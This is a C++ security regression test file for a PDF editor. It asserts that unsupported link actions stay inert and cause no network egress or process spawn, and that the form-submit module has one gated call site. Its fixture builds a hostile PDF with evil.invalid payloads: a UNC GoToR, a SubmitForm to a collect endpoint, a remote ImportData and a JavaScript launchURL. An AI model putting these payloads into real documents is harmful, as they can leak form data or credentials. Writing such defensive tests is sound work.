// -*- coding: utf-8 -*-
//
// Meta-audit 2026-07 follow-up, phase F13 (SEC-47 / SEC-52 / SEC-53):
// UNSUPPORTED PDF ACTION SUBTYPES ARE INERT — asserted, not assumed.
//
// Three phase-4 findings share one root: PDFE is safe here BY OMISSION, and
// omission is exactly the kind of safety that a well-meaning feature commit
// deletes without noticing.
//
//   SEC-53  /GoToR, /SubmitForm, /ImportData and /JavaScript link actions are
//           not parsed by AnnotationManager::getLinkAction
//           (src/annotations/AnnotationManager.cpp:1088-1151). They fall
//           through to the struct default (LinkActionType::Uri with an empty
//           URI), so followLinkAt() declines them. Correct today; guarded by
//           no test, so an "add /GoToR support" commit meets no red.
//   SEC-47  GoToRRemotePathRejected (tests/test_malicious_pdf_security.cpp:187)
//           is EXPECT_NO_THROW-only. Its comment claims the open "must not
//           trigger any network access" and NOTHING checked that. A named
//           security regression test that cannot fail on the property it names
//           is worse than no test. That existing test is left untouched; this
//           file adds the assertions it was missing, now that a network
//           observer exists (tests/security_net_oracles.h, SEC-46).
//   SEC-52  src/formsubmit/ (FormSubmitter, HostAllowlist, FormEncoder) WAS
//           built but referenced by nothing outside itself — a fully-built
//           network-egress module one wiring commit from production, with no
//           test guarding that wiring. As of GitHub #18 (pipeline
//           p83-outstanding phase-2) that wiring commit has been made,
//           deliberately, because the required-field enforcement the row
//           asked for had shipped dead. The guard below therefore changed
//           shape rather than being deleted: see its own comment.
//
// Nothing here is a vulnerability claim. These are standing guards over
// properties that currently hold.
#include <gtest/gtest.h>

#include "annotations/AnnotationManager.h"
#include "annotations/AnnotationType.h"
#include "core/Document.h"
#include "core/MuPdfContext.h"
#include "core/Page.h"
#include "formsubmit/HostAllowlist.h"
#include "security_net_oracles.h"
#include "security_oracles.h"
#include "ui/MainWindow.h"

#include <QApplication>
#include <QTemporaryDir>

#include <filesystem>
#include <fstream>
#include <memory>
#include <string>
#include <vector>

namespace {

std::filesystem::path rootDir()
{
    return std::filesystem::path(TEST_FIXTURES_DIR).parent_path().parent_path();
}

// Drop comment-ONLY lines (a `//`-prefixed line, or a line inside a /* */
// block). Used by the SEC-52 call-site scan below: its subject is call SITES,
// and a doc comment that merely names the module is not one. MainWindow.h
// documents submitCurrentFormTo by naming pdfe::formsubmit::toSubmitFields;
// counting that as a reference is reading a COMMENT and reporting it as the
// CODE, which is a mistake this project has made before.
//
// Deliberately conservative: only lines that are ENTIRELY comment are
// removed, never a trailing `//` on a code line. Stripping trailing comments
// would require handling string literals, and a URL literal like
// "https://host/" would otherwise take the rest of its line with it — hiding
// a real reference, which is the one failure mode this helper must not have.
std::string stripCommentOnlyLines(const std::string& src)
{
    std::string out;
    bool inBlock = false;
    std::size_t pos = 0;
    while (pos <= src.size()) {
        const std::size_t eol = src.find('\n', pos);
        const std::string line =
            src.substr(pos, eol == std::string::npos ? std::string::npos
                                                     : eol - pos);
        std::string trimmed = line;
        const std::size_t first = trimmed.find_first_not_of(" \t\r");
        trimmed = (first == std::string::npos) ? std::string()
                                               : trimmed.substr(first);

        bool drop = false;
        if (inBlock) {
            drop = true;
            if (trimmed.find("*/") != std::string::npos) inBlock = false;
        } else if (trimmed.rfind("//", 0) == 0) {
            drop = true;
        } else if (trimmed.rfind("/*", 0) == 0) {
            drop = true;
            if (trimmed.find("*/") == std::string::npos) inBlock = true;
        }
        if (!drop) { out += line; out += '\n'; }

        if (eol == std::string::npos) break;
        pos = eol + 1;
    }
    return out;
}

std::string slurpFile(const std::filesystem::path& p)
{
    std::ifstream f(p, std::ios::binary);
    if (!f.is_open()) return "";
    return std::string(std::istreambuf_iterator<char>(f),
                       std::istreambuf_iterator<char>());
}

// One page carrying four link annotations, each with an action subtype PDFE
// does not implement. Written as raw PDF because AnnotationManager cannot
// CREATE these subtypes — which is the point: an attacker's file can.
//
// Rect layout (PDF user space, origin bottom-left):
//   GoToR (UNC)      [ 50  50 150 100]
//   GoToR (remote)   [200  50 300 100]
//   SubmitForm       [ 50 150 150 200]
//   ImportData       [200 150 300 200]
//   JavaScript       [ 50 250 150 300]
std::string buildHostileActionPdf()
{
    const std::string content = "BT ET\n";
    std::string out;
    out += "%PDF-1.7\n";
    out += "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n";
    out += "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n";
    out += "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
           "/Contents 4 0 R /Resources << >> "
           "/Annots [10 0 R 11 0 R 12 0 R 13 0 R 14 0 R] >>\nendobj\n";
    out += "4 0 obj\n<< /Length " + std::to_string(content.size()) +
           " >>\nstream\n" + content + "endstream\nendobj\n";

    // /GoToR at a UNC target. In a PDF literal string a backslash is escaped,
    // so "\\\\\\\\host" here is  (\\\\host)  on disk =  \\host  as a value.
    out += "10 0 obj\n<< /Type /Annot /Subtype /Link /Rect [50 50 150 100] "
           "/Border [0 0 0] /A << /S /GoToR "
           "/F (\\\\\\\\evil.invalid\\\\share\\\\remote.pdf) /D [0 /Fit] >> "
           ">>\nendobj\n";
    // /GoToR at an http target.
    out += "11 0 obj\n<< /Type /Annot /Subtype /Link /Rect [200 50 300 100] "
           "/Border [0 0 0] /A << /S /GoToR "
           "/F (http://evil.invalid/remote.pdf) /D [0 /Fit] >> >>\nendobj\n";
    // /SubmitForm to a remote host.
    out += "12 0 obj\n<< /Type /Annot /Subtype /Link /Rect [50 150 150 200] "
           "/Border [0 0 0] /A << /S /SubmitForm "
           "/F << /FS /URL /F (http://evil.invalid/collect) >> /Flags 4 >> "
           ">>\nendobj\n";
    // /ImportData from a remote file spec.
    out += "13 0 obj\n<< /Type /Annot /Subtype /Link /Rect [200 150 300 200] "
           "/Border [0 0 0] /A << /S /ImportData "
           "/F (http://evil.invalid/fill.fdf) >> >>\nendobj\n";
    // /JavaScript link action.
    out += "14 0 obj\n<< /Type /Annot /Subtype /Link /Rect [50 250 150 300] "
           "/Border [0 0 0] /A << /S /JavaScript "
           "/JS (app.launchURL\\('http://evil.invalid/x'\\);) >> >>\nendobj\n";

    out += "trailer\n<< /Size 15 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";
    return out;
}

struct ActionProbe {
    const char* label;
    double x;
    double y;
};

const ActionProbe kProbes[] = {
    { "GoToR (UNC target)",    100.0,  75.0 },
    { "GoToR (http target)",   250.0,  75.0 },
    { "SubmitForm (http)",     100.0, 175.0 },
    { "ImportData (http)",     250.0, 175.0 },
    { "JavaScript link",       100.0, 275.0 },
};

} // namespace

class ActionEgressInertnessTest : public ::testing::Test {
protected:
    void SetUp() override
    {
        tempDir_ = std::make_unique<QTemporaryDir>();
        ASSERT_TRUE(tempDir_->isValid());
        pdf_ = std::filesystem::path(tempDir_->path().toStdString())
               / "hostile_actions.pdf";
        const std::string bytes = buildHostileActionPdf();
        std::ofstream f(pdf_, std::ios::binary);
        f.write(bytes.data(), static_cast<std::streamsize>(bytes.size()));
        f.close();

        mw_ = std::make_unique<pdfe::ui::MainWindow>();
        mw_->openFile(QString::fromStdString(pdf_.string()));
        QApplication::processEvents();

        pdfe::ui::MainWindow::resetLaunchCountersForTesting();
        pdfe::ui::MainWindow::resetUriCountersForTesting();
    }

    void TearDown() override
    {
        pdfe::ui::MainWindow::resetLaunchCountersForTesting();
        pdfe::ui::MainWindow::resetUriCountersForTesting();
        mw_.reset();
        QApplication::processEvents();
        tempDir_.reset();
    }

    std::unique_ptr<QTemporaryDir> tempDir_;
    std::filesystem::path pdf_;
    std::unique_ptr<pdfe::ui::MainWindow> mw_;
};

// ---------------------------------------------------------------------------
// SEC-53 — every unsupported action subtype must DECLINE. followLinkAt()
// returning false is the observable "PDFE did nothing with this action".
// ---------------------------------------------------------------------------
TEST_F(ActionEgressInertnessTest, UnknownActionSubtypeIsInert)
{
    // The document must actually carry the annotations, or every EXPECT_FALSE
    // below would pass simply because no link was found.
    auto ctx = std::make_shared<pdfe::core::MuPdfContext>();
    auto doc = pdfe::core::Document::open(ctx, pdf_);
    ASSERT_NE(doc, nullptr);
    auto page = doc->page(0);
    ASSERT_NE(page, nullptr);
    pdfe::annotations::AnnotationManager mgr(ctx);
    const auto annots = mgr.getAnnotations(page.get());
    int linkCount = 0;
    for (const auto& a : annots)
        if (a.type == pdfe::annotations::AnnotationType::Link) ++linkCount;
    ASSERT_EQ(linkCount, 5)
        << "the hostile-action fixture did not round-trip: this test would be "
           "vacuous. Found " << linkCount << " link annotations.";

    for (const ActionProbe& probe : kProbes) {
        EXPECT_FALSE(mw_->followLinkAt(0, QPointF(probe.x, probe.y)))
            << probe.label << ": PDFE now HANDLES an action subtype it did not "
               "implement at the time this guard was written. If support was "
               "added deliberately, the new dispatcher needs its own security "
               "review (remote fetch, form exfiltration, script execution) and "
               "this expectation must be replaced by assertions about that "
               "dispatcher — not simply deleted. (SEC-53)";
    }

    // None of them may reach the /Launch or /URI dispatchers either.
    EXPECT_EQ(pdfe::ui::MainWindow::launchPromptCountForTesting(), 0);
    EXPECT_EQ(pdfe::ui::MainWindow::uriDispatchedCountForTesting(), 0);
}

// ---------------------------------------------------------------------------
// SEC-47 — the property the existing GoToRRemotePathRejected test NAMED but
// never checked: opening and clicking a remote-target /GoToR makes no outbound
// connection and spawns no process.
// ---------------------------------------------------------------------------
TEST_F(ActionEgressInertnessTest, RemoteGoToRCausesNoEgressAndNoSpawn)
{
    pdfe_test::NetworkEgressGuard netGuard;
    ASSERT_TRUE(netGuard.supported())
        << "the network observer could not read the OS tables; this test "
           "observed NOTHING and must not be read as proving no egress";
    pdfe_test::ProcessSpawnGuard spawnGuard;

    // Re-open under the guards so the OPEN itself is observed too — a resolver
    // touch during parse would be exactly the leak SEC-47 was written about.
    {
        auto ctx = std::make_shared<pdfe::core::MuPdfContext>();
        auto doc = pdfe::core::Document::open(ctx, pdf_);
        ASSERT_NE(doc, nullptr);
        auto page = doc->page(0);
        ASSERT_NE(page, nullptr);
        pdfe::annotations::AnnotationManager mgr(ctx);
        (void)mgr.getAnnotations(page.get());
    }

    EXPECT_FALSE(mw_->followLinkAt(0, QPointF(100.0, 75.0)))   // UNC GoToR
        << "the UNC /GoToR must be declined";
    EXPECT_FALSE(mw_->followLinkAt(0, QPointF(250.0, 75.0)))   // http GoToR
        << "the remote /GoToR must be declined";
    QApplication::processEvents();

    netGuard.stop();
    EXPECT_EQ(netGuard.externalConnectionCount(), 0u)
        << "opening and clicking a remote-target /GoToR produced an OUTBOUND "
           "connection.\n" << netGuard.report();
    EXPECT_EQ(spawnGuard.newlySpawned(), std::string())
        << "a remote /GoToR spawned a child process";
}

// ---------------------------------------------------------------------------
// SEC-52 — the built-but-unwired form-submit module.
// ---------------------------------------------------------------------------
TEST(FormSubmitIsolation, HostAllowlistDeniesUnknownHostsByDefault)
{
    pdfe::formsubmit::HostAllowlist allowlist;

    // A default-constructed allowlist must permit NOTHING. "Confirm on first
    // use, allow afterwards" is only safe if first use is genuinely denied.
    EXPECT_FALSE(allowlist.contains("evil.invalid"));
    EXPECT_FALSE(allowlist.contains("example.com"));
    EXPECT_FALSE(allowlist.contains("localhost"));
    EXPECT_FALSE(allowlist.contains(""));
    EXPECT_TRUE(allowlist.hosts().empty());

    // ... and it is not vacuously deny-all: an explicitly allowed host passes,
    // case-insensitively, and can be revoked.
    allowlist.allow("Trusted.Example.COM");
    EXPECT_TRUE(allowlist.contains("trusted.example.com"));
    EXPECT_TRUE(allowlist.contains("TRUSTED.EXAMPLE.COM"));
    EXPECT_FALSE(allowlist.contains("evil.invalid"));
    allowlist.revoke("trusted.example.com");
    EXPECT_FALSE(allowlist.contains("trusted.example.com"));
}

// SEC-52, RESTATED — pipeline p83-outstanding phase-2, GitHub #18.
//
// This guard used to assert that NO src/ui translation unit referenced the
// form-submit module, because none did: the module was built and wired to
// nothing. Its failure message named the price of changing that — "a consent
// gate, a host-allowlist prompt, and its own egress tests — and Security/
// externalActionsAllowed (SEC-49) should gate it" — and said the guard existed
// "so that wiring is a deliberate, reviewed act".
//
// #18 is that deliberate act, and it was forced: the enforcement the row asked
// for had shipped DEAD. So the property worth guarding is no longer "nobody
// references the module". It is "exactly one file does, and it still pays the
// price": one call site, gated on externalActionsAllowed, prompting on an
// unconfirmed host, refusing an incomplete required-field form.
//
// Deleting the old guard and writing nothing would have quietly converted a
// standing security property into an absence. This replaces it with the
// narrower property that is now true, and fails on anything wider.
TEST(FormSubmitIsolation, TheOnlyUiFormSubmitCallSiteIsMainWindowAndItIsGated)
{
    const std::filesystem::path uiDir = rootDir() / "src" / "ui";
    ASSERT_TRUE(std::filesystem::exists(uiDir));

    std::vector<std::string> referencing;
    int scanned = 0;
    for (const auto& entry : std::filesystem::recursive_directory_iterator(uiDir)) {
        if (!entry.is_regular_file()) continue;
        const std::string ext = entry.path().extension().string();
        if (ext != ".cpp" && ext != ".h" && ext != ".hpp") continue;
        ++scanned;
        const std::string src = stripCommentOnlyLines(slurpFile(entry.path()));
        if (src.find("pdfe::formsubmit") != std::string::npos ||
            src.find("formsubmit/") != std::string::npos) {
            referencing.push_back(entry.path().filename().string());
        }
    }
    ASSERT_GT(scanned, 10) << "src/ui scan found too few files to be meaningful";

    std::string list;
    for (const auto& o : referencing) {
        if (!list.empty()) list += ", ";
        list += o;
    }

    ASSERT_EQ(referencing.size(), 1u)
        << "src/ui references the form-submit module from " << referencing.size()
        << " file(s) (" << list << "). /SubmitForm is a NETWORK EGRESS path and "
           "PDFE's documented default posture is zero outbound connections "
           "(tests/test_default_egress_posture.cpp). Exactly ONE reviewable "
           "call site is allowed: MainWindow.cpp. (SEC-52 / GitHub #18)";
    EXPECT_EQ(referencing.front(), std::string("MainWindow.cpp"))
        << "the single form-submit reference in src/ui moved to "
        << referencing.front();

    // ... and that one call site must still carry the controls the original
    // guard demanded. Asserting only "one file" would let the gate be deleted
    // without reddening anything.
    const std::string mw = slurpFile(uiDir / "MainWindow.cpp");
    ASSERT_FALSE(mw.empty());
    EXPECT_NE(mw.find("externalActionsAllowed()"), std::string::npos)
        << "MainWindow.cpp wires /SubmitForm without consulting the SEC-49 "
           "consent gate AppSettings::externalActionsAllowed()";
    // The Submit Form… action must actually REACH the entry point. Everything
    // else here could hold while the dialog's Accept button still did nothing,
    // which is precisely the state #18 was open about.
    EXPECT_NE(mw.find("submitCurrentFormTo(target,"), std::string::npos)
        << "the Submit Form… dialog no longer calls submitCurrentFormTo(), so "
           "the enforcement is unreachable from the UI again";
    EXPECT_NE(mw.find("FormSubmitter::shouldSubmit"), std::string::npos)
        << "the UI submit path no longer asks FormSubmitter::shouldSubmit, so "
           "the destination and required-field rules are not consulted";
    EXPECT_NE(mw.find("missingRequiredFields"), std::string::npos)
        << "the UI submit path no longer names the missing required fields";
    EXPECT_NE(mw.find("confirmedSubmitHosts_"), std::string::npos)
        << "the per-session host confirmation was removed from the UI submit "
           "path, so a first-use host is no longer prompted for";
}

// The scanner above only means anything if its comment-stripping cannot hide a
// real reference. A helper that removed too much would turn the guard into one
// that can never fire — decoration, which is worse than no guard.
TEST(FormSubmitIsolation, TheCallSiteScannerIgnoresCommentsButNotCode)
{
    const std::string sample =
        "// #include \"formsubmit/FormSubmitter.h\"\n"
        "/* pdfe::formsubmit::FormSubmitter in a block comment\n"
        "   pdfe::formsubmit again, still in the block */\n"
        "int keep = 1;  // trailing comment\n"
        "const char* url = \"https://example.com/submit\";\n";
    const std::string stripped = stripCommentOnlyLines(sample);

    EXPECT_EQ(stripped.find("formsubmit"), std::string::npos)
        << "comment-only references survived stripping: " << stripped;
    // ... and the code lines are intact, including the one whose string
    // literal contains "//".
    EXPECT_NE(stripped.find("int keep = 1;"), std::string::npos);
    EXPECT_NE(stripped.find("https://example.com/submit"), std::string::npos)
        << "a code line carrying a URL literal was eaten by the stripper";

    // A genuine code reference must survive.
    const std::string real =
        "#include \"formsubmit/FormSubmitter.h\"\n"
        "auto d = pdfe::formsubmit::FormSubmitter::shouldSubmit(u, a, f);\n";
    const std::string keptReal = stripCommentOnlyLines(real);
    EXPECT_NE(keptReal.find("formsubmit/"), std::string::npos);
    EXPECT_NE(keptReal.find("pdfe::formsubmit"), std::string::npos);
}
